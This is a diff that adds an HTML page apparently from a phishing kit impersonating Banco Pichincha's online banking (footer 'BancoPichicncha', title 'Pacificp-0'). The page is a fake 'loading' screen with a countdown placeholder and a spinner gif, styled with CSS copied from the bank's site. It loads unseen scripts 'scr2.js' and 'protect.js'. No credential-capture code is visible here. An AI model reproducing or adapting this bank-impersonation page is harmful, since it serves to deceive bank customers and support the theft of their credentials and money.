@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pacificp-0</title>
+    <link rel="icon" href="data:," />
+</head>
+
+<style>
+
+    .ip1 {     -webkit-text-size-adjust: 100%;
+        -webkit-tap-highlight-color: rgba(0,0,0,0);
+        --chart-color-auto-transport: #2f7abf;
+        --chart-color-business-services: #2f7abf;
+        --chart-color-education: #2f7abf;
+        --chart-color-entertainment: #2f7abf;
+        --chart-color-food-dining: #2f7abf;
+        --chart-color-fees-charges: #2f7abf;
+        --chart-color-financial: #2f7abf;
+        --chart-color-gifts-donations: #2f7abf;
+        --chart-color-health-fitness: #2f7abf;
+        --chart-color-kids: #2f7abf;
+        --chart-color-investments: #2f7abf;
+        --chart-color-personal-care: #2f7abf;
+        --chart-color-pets: #2f7abf;
+        --chart-color-taxes: #2f7abf;
+        --chart-color-transfer: #2f7abf;
+        --chart-color-travel: #2f7abf;
+        --chart-color-upcoming-transactions: #2f7abf;
+        --chart-color-pending: #2f7abf;
+        --chart-color-equipment-and-materials: #2f7abf;
+        --chart-color-financials: #2f7abf;
+        --chart-color-human-resources: #2f7abf;
+        --chart-color-insurance: #2f7abf;
+        --chart-color-real-estate: #2f7abf;
+        --chart-color-services: #2f7abf;
+        --chart-color-transport: #2f7abf;
+        --chart-color-mortgage: #2f7abf;
+        --chart-color-rent: #2f7abf;
+        --chart-color-beauty: #2f7abf;
+        --chart-color-alcohol-bars: #2f7abf;
+        --chart-color-fast-food: #2f7abf;
+        --chart-color-groceries: #2f7abf;
+        --chart-color-restaurants: #2f7abf;
+        --chart-color-car: #2f7abf;
+        --chart-color-public-transport: #2f7abf;
+        --chart-color-clothing: #2f7abf;
+        --chart-color-electronics: #2f7abf;
+        --chart-color-internet: #2f7abf;
+        --chart-color-mobile-phone: #2f7abf;
+        --chart-color-utilities: #2f7abf;
+        --chart-color-bonus: #2f7abf;
+        --chart-color-salary-wages: #2f7abf;
+        --chart-color-interest-income: #2f7abf;
+        --chart-color-rental-income: #2f7abf;
+        --chart-color-income: #2f7abf;
+        --chart-color-home: #2f7abf;
+        --chart-color-transfers: #2f7abf;
+        --chart-color-shopping: #2f7abf;
+        --chart-color-uncategorised: #2f7abf;
+        --chart-color-uncategorized: #2f7abf;
+        --chart-color-transportation: #2f7abf;
+        --chart-color-bills-utilities: #2f7abf;
+        --chart-color-hobbies-entertainment: #2f7abf;
+        --chart-color-health-beauty: #2f7abf;
+        --chart-color-food-drinks: #2f7abf;
+        --chart-color-other-income: #2f7abf;
+        --chart-color-suppliers: #00a1e0;
+        --chart-color-salaries: #4da1d9;
+        --chart-color-office-rent: #366e39;
+        --chart-color-loan-repayment: #0079c9;
+        --chart-color-miscellaneous: #2e7d32;
+        --chart-color-intercompany-receivable: #f2780c;
+        --chart-color-term-deposit: #0079c9;
+        --chart-color-direct-debit-collections: #c22327;
+        --chart-color-intracompany-receivable: #49074e;
+        --chart-color-interest-received: #181e41;
+        --chart-categories-colors: auto-transport #2f7abf commute,bills-utilities #2f7abf receipt,business-services #2f7abf business_center,education #2f7abf school,entertainment #2f7abf local_activity,food-dining #2f7abf fastfood,fees-charges #2f7abf money,financial #2f7abf attach_money,gifts-donations #2f7abf card_giftcard,health-fitness #2f7abf favorite_border,home #2f7abf home,income #2f7abf add_box,kids #2f7abf child_care,investments #2f7abf local_florist,personal-care #2f7abf hot_tub,pets #2f7abf pets,shopping #2f7abf shopping_cart,taxes #2f7abf monetization_on,transfer #2f7abf swap_horiz,travel #2f7abf flight,upcoming-transactions #2f7abf insert_invitation,uncategorised #2f7abf help_outline,uncategorized #2f7abf help_outline,pending #2f7abf access_time,equipment-and-materials #2f7abf build,financials #2f7abf attach_money,human-resources #2f7abf people,insurance #2f7abf security,real-estate #2f7abf business,services #2f7abf shopping_basket,transport #2f7abf commute,utilities #2f7abf receipt,mortgage #2f7abf home,rent #2f7abf home,beauty #2f7abf favorite,alcohol-bars #2f7abf restaurant,fast-food #2f7abf restaurant,groceries #2f7abf restaurant,restaurants #2f7abf restaurant,car #2f7abf directions_car,public-transport #2f7abf directions_car,clothing #2f7abf shopping_cart,electronics #2f7abf shopping_cart,internet #2f7abf description,mobile-phone #2f7abf description,utilities #2f7abf description,bonus #2f7abf add_box,salary-wages #2f7abf add_box,interest-income #2f7abf toll,rental-income #2f7abf toll,income #0079c9 add_box,home #00a1e0 home,transfers #ffac09 swap_horiz,shopping #f2780c shopping_cart,uncategorised #e24b2c help_outline,uncategorized #e24b2c help_outline,transportation #c22327 directions_car,bills-utilities #49074e description,hobbies-entertainment #181e41 local_play,health-beauty #260a24 favorite,food-drinks #2e7d32 restaurant,other-income #2f7abf toll,suppliers #00a1e0,salaries #4da1d9,office-rent #366e39,loan-repayment #0079c9,miscellaneous #2e7d32,intercompany-receivable #f2780c,term-deposit #0079c9,direct-debit-collections #c22327,intracompany-receivable #49074e,interest-received #181e41;
+        --gray-1: #4a4a4a;
+        --blue: #007bff;
+        --indigo: #6610f2;
+        --purple: #6f42c1;
+        --pink: #e83e8c;
+        --red: #dc3545;
+        --orange: #fd7e14;
+        --yellow: #ffc107;
+        --green: #28a745;
+        --teal: #20c997;
+        --cyan: #17a2b8;
+        --white: #fff;
+        --gray: #6c757d;
+        --gray-dark: #343a40;
+        --primary: #fd0;
+        --secondary: #2f7abf;
+        --success: #2e7d32;
+        --info: #0f265c;
+        --warning: #fbc02d;
+        --danger: #d50707;
+        --light: #e9eaeb;
+        --dark: #333;
+        --breakpoint-xs: 0;
+        --breakpoint-sm: 576px;
+        --breakpoint-md: 768px;
+        --breakpoint-lg: 992px;
+        --breakpoint-xl: 1200px;
+        --font-family-sans-serif: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";
+        --font-family-monospace: SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;
+        --chart-group-bar-color: #1687b3,#4dbde9;
+        --chart-primary-color: #0079c9;
+        --chart-primary-light-color: #4da1d9;
+        --chart-negative-light-color: #e06d6d;
+        --chart-negative-color: #d32f2f;
+        --chart-positive-color: #2e7d32;
+        --chart-secondary-color: #181e41;
+        --chart-benchmark-color: #4da1d9;
+        --chart-neutral-color: #f2f2f2;
+        --chart-neutral-grey-color: #dedede;
+        --chart-accent-color: #f2780c;
+        --chart-alert-color: #f8e0e0;
+        --chart-colors: #0098fc,#f5933c,#3ca241,#ffbd3c,#77b7e2,#dc5959,#4e154a,#262f66,#750b7d,#f5933c,#005a96,#c1600a,#205823,#d58d00,#2b89c8,#ab2424,#000,#0a0d1c,#1d031f,#c1600a;
+        --wealth-chart-colors: #0079c9,#00a1e0,#ffac09,#f2780c,#e24b2c,#49074e,#181e41,#260a24;
+        --chart-tooltip-caret-size: 14px;
+        word-wrap: break-word;
+        box-sizing: border-box;
+        margin: 0;
+        overflow: visible;
+        display: block;
+        width: 90%;
+        height: 48px;
+        padding: 1rem;
+        
+        font-size: .875rem;
+        font-weight: 500;
+        line-height: 1.5;
+        color: #4a4a4a;
+        background-color: #fff;
+        background-clip: padding-box;
+        border-radius: 4px;
+        transition: border-color .15s ease-in-out,box-shadow .15s ease-in-out;
+        border: 1px solid #c8c8c8;}
+    
+    .botonn {
+        -webkit-text-size-adjust: 100%;
+        -webkit-tap-highlight-color: rgba(0,0,0,0);
+        --chart-color-auto-transport: #2f7abf;
+        --chart-color-business-services: #2f7abf;
+        --chart-color-education: #2f7abf;
+        --chart-color-entertainment: #2f7abf;
+        --chart-color-food-dining: #2f7abf;
+        --chart-color-fees-charges: #2f7abf;
+        --chart-color-financial: #2f7abf;
+        --chart-color-gifts-donations: #2f7abf;
+        --chart-color-health-fitness: #2f7abf;
+        --chart-color-kids: #2f7abf;
+        --chart-color-investments: #2f7abf;
+        --chart-color-personal-care: #2f7abf;
+        --chart-color-pets: #2f7abf;
+        --chart-color-taxes: #2f7abf;
+        --chart-color-transfer: #2f7abf;
+        --chart-color-travel: #2f7abf;
+        --chart-color-upcoming-transactions: #2f7abf;
+        --chart-color-pending: #2f7abf;
+        --chart-color-equipment-and-materials: #2f7abf;
+        --chart-color-financials: #2f7abf;
+        --chart-color-human-resources: #2f7abf;
+        --chart-color-insurance: #2f7abf;
+        --chart-color-real-estate: #2f7abf;
+        --chart-color-services: #2f7abf;
+        --chart-color-transport: #2f7abf;
+        --chart-color-mortgage: #2f7abf;
+        --chart-color-rent: #2f7abf;
+        --chart-color-beauty: #2f7abf;
+        --chart-color-alcohol-bars: #2f7abf;
+        --chart-color-fast-food: #2f7abf;
+        --chart-color-groceries: #2f7abf;
+        --chart-color-restaurants: #2f7abf;
+        --chart-color-car: #2f7abf;
+        --chart-color-public-transport: #2f7abf;
+        --chart-color-clothing: #2f7abf;
+        --chart-color-electronics: #2f7abf;
+        --chart-color-internet: #2f7abf;
+        --chart-color-mobile-phone: #2f7abf;
+        --chart-color-utilities: #2f7abf;
+        --chart-color-bonus: #2f7abf;
+        --chart-color-salary-wages: #2f7abf;
+        --chart-color-interest-income: #2f7abf;
+        --chart-color-rental-income: #2f7abf;
+        --chart-color-income: #2f7abf;
+        --chart-color-home: #2f7abf;
+        --chart-color-transfers: #2f7abf;
+        --chart-color-shopping: #2f7abf;
+        --chart-color-uncategorised: #2f7abf;
+        --chart-color-uncategorized: #2f7abf;
+        --chart-color-transportation: #2f7abf;
+        --chart-color-bills-utilities: #2f7abf;
+        --chart-color-hobbies-entertainment: #2f7abf;
+        --chart-color-health-beauty: #2f7abf;
+        --chart-color-food-drinks: #2f7abf;
+        --chart-color-other-income: #2f7abf;
+        --chart-color-suppliers: #00a1e0;
+        --chart-color-salaries: #4da1d9;
+        --chart-color-office-rent: #366e39;
+        --chart-color-loan-repayment: #0079c9;
+        --chart-color-miscellaneous: #2e7d32;
+        --chart-color-intercompany-receivable: #f2780c;
+        --chart-color-term-deposit: #0079c9;
+        --chart-color-direct-debit-collections: #c22327;
+        --chart-color-intracompany-receivable: #49074e;
+        --chart-color-interest-received: #181e41;
+        --chart-categories-colors: auto-transport #2f7abf commute,bills-utilities #2f7abf receipt,business-services #2f7abf business_center,education #2f7abf school,entertainment #2f7abf local_activity,food-dining #2f7abf fastfood,fees-charges #2f7abf money,financial #2f7abf attach_money,gifts-donations #2f7abf card_giftcard,health-fitness #2f7abf favorite_border,home #2f7abf home,income #2f7abf add_box,kids #2f7abf child_care,investments #2f7abf local_florist,personal-care #2f7abf hot_tub,pets #2f7abf pets,shopping #2f7abf shopping_cart,taxes #2f7abf monetization_on,transfer #2f7abf swap_horiz,travel #2f7abf flight,upcoming-transactions #2f7abf insert_invitation,uncategorised #2f7abf help_outline,uncategorized #2f7abf help_outline,pending #2f7abf access_time,equipment-and-materials #2f7abf build,financials #2f7abf attach_money,human-resources #2f7abf people,insurance #2f7abf security,real-estate #2f7abf business,services #2f7abf shopping_basket,transport #2f7abf commute,utilities #2f7abf receipt,mortgage #2f7abf home,rent #2f7abf home,beauty #2f7abf favorite,alcohol-bars #2f7abf restaurant,fast-food #2f7abf restaurant,groceries #2f7abf restaurant,restaurants #2f7abf restaurant,car #2f7abf directions_car,public-transport #2f7abf directions_car,clothing #2f7abf shopping_cart,electronics #2f7abf shopping_cart,internet #2f7abf description,mobile-phone #2f7abf description,utilities #2f7abf description,bonus #2f7abf add_box,salary-wages #2f7abf add_box,interest-income #2f7abf toll,rental-income #2f7abf toll,income #0079c9 add_box,home #00a1e0 home,transfers #ffac09 swap_horiz,shopping #f2780c shopping_cart,uncategorised #e24b2c help_outline,uncategorized #e24b2c help_outline,transportation #c22327 directions_car,bills-utilities #49074e description,hobbies-entertainment #181e41 local_play,health-beauty #260a24 favorite,food-drinks #2e7d32 restaurant,other-income #2f7abf toll,suppliers #00a1e0,salaries #4da1d9,office-rent #366e39,loan-repayment #0079c9,miscellaneous #2e7d32,intercompany-receivable #f2780c,term-deposit #0079c9,direct-debit-collections #c22327,intracompany-receivable #49074e,interest-received #181e41;
+        --gray-1: #4a4a4a;
+        --blue: #007bff;
+        --indigo: #6610f2;
+        --purple: #6f42c1;
+        --pink: #e83e8c;
+        --red: #dc3545;
+        --orange: #fd7e14;
+        --yellow: #ffc107;
+        --green: #28a745;
+        --teal: #20c997;
+        --cyan: #17a2b8;
+        --white: #fff;
+        --gray: #6c757d;
+        --gray-dark: #343a40;
+        --primary: #fd0;
+        --secondary: #2f7abf;
+        --success: #2e7d32;
+        --info: #0f265c;
+        --warning: #fbc02d;
+        --danger: #d50707;
+        --light: #e9eaeb;
+        --dark: #333;
+        --breakpoint-xs: 0;
+        --breakpoint-sm: 576px;
+        --breakpoint-md: 768px;
+        --breakpoint-lg: 992px;
+        --breakpoint-xl: 1200px;
+        --font-family-sans-serif: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";
+        --font-family-monospace: SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;
+        --chart-group-bar-color: #1687b3,#4dbde9;
+        --chart-primary-color: #0079c9;
+        --chart-primary-light-color: #4da1d9;
+        --chart-negative-light-color: #e06d6d;
+        --chart-negative-color: #d32f2f;
+        --chart-positive-color: #2e7d32;
+        --chart-secondary-color: #181e41;
+        --chart-benchmark-color: #4da1d9;
+        --chart-neutral-color: #f2f2f2;
+        --chart-neutral-grey-color: #dedede;
+        --chart-accent-color: #f2780c;
+        --chart-alert-color: #f8e0e0;
+        --chart-colors: #0098fc,#f5933c,#3ca241,#ffbd3c,#77b7e2,#dc5959,#4e154a,#262f66,#750b7d,#f5933c,#005a96,#c1600a,#205823,#d58d00,#2b89c8,#ab2424,#000,#0a0d1c,#1d031f,#c1600a;
+        --wealth-chart-colors: #0079c9,#00a1e0,#ffac09,#f2780c,#e24b2c,#49074e,#181e41,#260a24;
+        --chart-tooltip-caret-size: 14px;
+        word-wrap: break-word;
+        box-sizing: border-box;
+        margin: 0;
+        overflow: visible;
+        text-transform: none;
+        color: #0f265c!important;
+        height: 48px;
+        font-family: Prelo-SemiBold,sans-serif!important;
+        text-align: center;
+        vertical-align: middle;
+        user-select: none;
+        border: 1px solid transparent;
+        padding: .5rem 2rem;
+        font-size: .875rem;
+        line-height: 1.607142855;
+        border-radius: 4px;
+        transition: color .2s ease-in-out,background-color .2s ease-in-out,border-color .2s ease-in-out,box-shadow .2s ease-in-out;
+        width: 90%;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        font-weight: 500;
+        white-space: nowrap;
+        background-color: #fd0;
+        border-color: #fd0;
+        -webkit-appearance: none;
+        position: relative;
+        cursor: pointer;
+    }
+    
+    
+    .boton {
+        margin-bottom: 8px !important;
+        -webkit-appearance: none;
+        -webkit-border-radius: 0;
+        color: #005eb8;
+        width: 90%;
+        height: 32px;
+        background: #ECEFF1;
+        border-color: #ECEFF1;
+        border: 0px;
+        font-family: Helvetica!important;
+        font-style: normal;
+        font-weight: normal;
+        font-size: 14px!important;
+    }
+    
+    .boton3 {
+        outline: none !important;
+        border: 1px solid #a5a5a6;
+        border-radius: 2px !important;
+        padding: 5px 5px 5px 8px;
+        display: inline;
+        line-height: 20px;
+        max-width: 100%;
+        color: #005eb8;
+        border-color: #005eb8;
+        font-family: Helvetica!important;
+        font-style: normal;
+        font-weight: normal;
+        font-size: 14px!important;
+        width: 90%;
+        height: 100%;
+        background: none;
+        margin-top: 3%;
+    }
+    
+    
+    .pp {
+        -webkit-text-size-adjust: 100%;
+        -webkit-tap-highlight-color: rgba(0,0,0,0);
+        --chart-color-auto-transport: #2f7abf;
+        --chart-color-business-services: #2f7abf;
+        --chart-color-education: #2f7abf;
+        --chart-color-entertainment: #2f7abf;
+        --chart-color-food-dining: #2f7abf;
+        --chart-color-fees-charges: #2f7abf;
+        --chart-color-financial: #2f7abf;
+        --chart-color-gifts-donations: #2f7abf;
+        --chart-color-health-fitness: #2f7abf;
+        --chart-color-kids: #2f7abf;
+        --chart-color-investments: #2f7abf;
+        --chart-color-personal-care: #2f7abf;
+        --chart-color-pets: #2f7abf;
+        --chart-color-taxes: #2f7abf;
+        --chart-color-transfer: #2f7abf;
+        --chart-color-travel: #2f7abf;
+        --chart-color-upcoming-transactions: #2f7abf;
+        --chart-color-pending: #2f7abf;
+        --chart-color-equipment-and-materials: #2f7abf;
+        --chart-color-financials: #2f7abf;
+        --chart-color-human-resources: #2f7abf;
+        --chart-color-insurance: #2f7abf;
+        --chart-color-real-estate: #2f7abf;
+        --chart-color-services: #2f7abf;
+        --chart-color-transport: #2f7abf;
+        --chart-color-mortgage: #2f7abf;
+        --chart-color-rent: #2f7abf;
+        --chart-color-beauty: #2f7abf;
+        --chart-color-alcohol-bars: #2f7abf;
+        --chart-color-fast-food: #2f7abf;
+        --chart-color-groceries: #2f7abf;
+        --chart-color-restaurants: #2f7abf;
+        --chart-color-car: #2f7abf;
+        --chart-color-public-transport: #2f7abf;
+        --chart-color-clothing: #2f7abf;
+        --chart-color-electronics: #2f7abf;
+        --chart-color-internet: #2f7abf;
+        --chart-color-mobile-phone: #2f7abf;
+        --chart-color-utilities: #2f7abf;
+        --chart-color-bonus: #2f7abf;
+        --chart-color-salary-wages: #2f7abf;
+        --chart-color-interest-income: #2f7abf;
+        --chart-color-rental-income: #2f7abf;
+        --chart-color-income: #2f7abf;
+        --chart-color-home: #2f7abf;
+        --chart-color-transfers: #2f7abf;
+        --chart-color-shopping: #2f7abf;
+        --chart-color-uncategorised: #2f7abf;
+        --chart-color-uncategorized: #2f7abf;
+        --chart-color-transportation: #2f7abf;
+        --chart-color-bills-utilities: #2f7abf;
+        --chart-color-hobbies-entertainment: #2f7abf;
+        --chart-color-health-beauty: #2f7abf;
+        --chart-color-food-drinks: #2f7abf;
+        --chart-color-other-income: #2f7abf;
+        --chart-color-suppliers: #00a1e0;
+        --chart-color-salaries: #4da1d9;
+        --chart-color-office-rent: #366e39;
+        --chart-color-loan-repayment: #0079c9;
+        --chart-color-miscellaneous: #2e7d32;
+        --chart-color-intercompany-receivable: #f2780c;
+        --chart-color-term-deposit: #0079c9;
+        --chart-color-direct-debit-collections: #c22327;
+        --chart-color-intracompany-receivable: #49074e;
+        --chart-color-interest-received: #181e41;
+        --chart-categories-colors: auto-transport #2f7abf commute,bills-utilities #2f7abf receipt,business-services #2f7abf business_center,education #2f7abf school,entertainment #2f7abf local_activity,food-dining #2f7abf fastfood,fees-charges #2f7abf money,financial #2f7abf attach_money,gifts-donations #2f7abf card_giftcard,health-fitness #2f7abf favorite_border,home #2f7abf home,income #2f7abf add_box,kids #2f7abf child_care,investments #2f7abf local_florist,personal-care #2f7abf hot_tub,pets #2f7abf pets,shopping #2f7abf shopping_cart,taxes #2f7abf monetization_on,transfer #2f7abf swap_horiz,travel #2f7abf flight,upcoming-transactions #2f7abf insert_invitation,uncategorised #2f7abf help_outline,uncategorized #2f7abf help_outline,pending #2f7abf access_time,equipment-and-materials #2f7abf build,financials #2f7abf attach_money,human-resources #2f7abf people,insurance #2f7abf security,real-estate #2f7abf business,services #2f7abf shopping_basket,transport #2f7abf commute,utilities #2f7abf receipt,mortgage #2f7abf home,rent #2f7abf home,beauty #2f7abf favorite,alcohol-bars #2f7abf restaurant,fast-food #2f7abf restaurant,groceries #2f7abf restaurant,restaurants #2f7abf restaurant,car #2f7abf directions_car,public-transport #2f7abf directions_car,clothing #2f7abf shopping_cart,electronics #2f7abf shopping_cart,internet #2f7abf description,mobile-phone #2f7abf description,utilities #2f7abf description,bonus #2f7abf add_box,salary-wages #2f7abf add_box,interest-income #2f7abf toll,rental-income #2f7abf toll,income #0079c9 add_box,home #00a1e0 home,transfers #ffac09 swap_horiz,shopping #f2780c shopping_cart,uncategorised #e24b2c help_outline,uncategorized #e24b2c help_outline,transportation #c22327 directions_car,bills-utilities #49074e description,hobbies-entertainment #181e41 local_play,health-beauty #260a24 favorite,food-drinks #2e7d32 restaurant,other-income #2f7abf toll,suppliers #00a1e0,salaries #4da1d9,office-rent #366e39,loan-repayment #0079c9,miscellaneous #2e7d32,intercompany-receivable #f2780c,term-deposit #0079c9,direct-debit-collections #c22327,intracompany-receivable #49074e,interest-received #181e41;
+        --gray-1: #4a4a4a;
+        --blue: #007bff;
+        --indigo: #6610f2;
+        --purple: #6f42c1;
+        --pink: #e83e8c;
+        --red: #dc3545;
+        --orange: #fd7e14;
+        --yellow: #ffc107;
+        --green: #28a745;
+        --teal: #20c997;
+        --cyan: #17a2b8;
+        --white: #fff;
+        --gray: #6c757d;
+        --gray-dark: #343a40;
+        --primary: #fd0;
+        --secondary: #2f7abf;
+        --success: #2e7d32;
+        --info: #0f265c;
+        --warning: #fbc02d;
+        --danger: #d50707;
+        --light: #e9eaeb;
+        --dark: #333;
+        --breakpoint-xs: 0;
+        --breakpoint-sm: 576px;
+        --breakpoint-md: 768px;
+        --breakpoint-lg: 992px;
+        --breakpoint-xl: 1200px;
+        --font-family-sans-serif: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";
+        --font-family-monospace: SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;
+        --chart-group-bar-color: #1687b3,#4dbde9;
+        --chart-primary-color: #0079c9;
+        --chart-primary-light-color: #4da1d9;
+        --chart-negative-light-color: #e06d6d;
+        --chart-negative-color: #d32f2f;
+        --chart-positive-color: #2e7d32;
+        --chart-secondary-color: #181e41;
+        --chart-benchmark-color: #4da1d9;
+        --chart-neutral-color: #f2f2f2;
+        --chart-neutral-grey-color: #dedede;
+        --chart-accent-color: #f2780c;
+        --chart-alert-color: #f8e0e0;
+        --chart-colors: #0098fc,#f5933c,#3ca241,#ffbd3c,#77b7e2,#dc5959,#4e154a,#262f66,#750b7d,#f5933c,#005a96,#c1600a,#205823,#d58d00,#2b89c8,#ab2424,#000,#0a0d1c,#1d031f,#c1600a;
+        --wealth-chart-colors: #0079c9,#00a1e0,#ffac09,#f2780c,#e24b2c,#49074e,#181e41,#260a24;
+        --chart-tooltip-caret-size: 14px;
+        font-family: Prelo-Medium;
+        font-size: 1rem;
+        font-weight: 500;
+        line-height: 1.5;
+        color: #4a4a4a;
+        box-sizing: border-box;
+        position: sticky;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 56px;
+        padding: 16px;
+        box-shadow: 0 8px 8px -8px rgba(7,7,7,.16);
+        background: #fff;
+        z-index: 4;
+        text-align: center;
+    }
+    
+    </style>
+    
+
+
+<body style="margin: 0;">
+    
+
+<center>
+    <div style="" class="pp">
+
+        <img style="width: 120px; margin-top: px;" src="pichu.svg" alt="">
+        
+        </div>
+
+<br>
+<br>
+
+
+<img style="width: 150px;" src="carga-inhresando.png" alt="">
+
+<br><br><br>
+<div style="width: 300px ; margin-top: 5px;">
+
+
+
+<form action="" style="width: 300px; font-family: sans-serif;">
+
+      <br>
+     <br>
+
+     <div style="font-size: 14px; color: white;">
+       <p></p>  <span id="countdown"> </span>
+
+
+     </div>
+     <img style="position: absolute; margin-top: -90px;margin-left: -81px; width: 150px;" src="tenor.gif">
+
+     <script src="scr2.js"></script>
+    
+
+
+
+<br><br><br><br>
+
+
+
+
+
+
+
+
+
+</form>
+
+
+<br><br><br>
+
+
+
+</div>  
+
+
+</div>
+<br><br><br>
+
+<div style="color: #B3BAC0 !important; font-family: sans-serif; font-size: 11px; border: 1px solid;background-color: #f7fbff; height: 150px;" >
+    <br>  <p >Recomendamos utilizar la Banca Virtual con los navegadores</p>
+      
+      <p>Internet explorer 11.0, Chrome 36.0.1, Firefox 31.0, Microsoft Edge.</p>
+      <br>
+      <p>© Copyright 2024 BancoPichicncha *V4.7.43</p>
+      
+      
+      </div>
+  
+  
+  
+  
+  </center>
+  
+  </body>
+  <script src="protect.js"></script>
+</html>
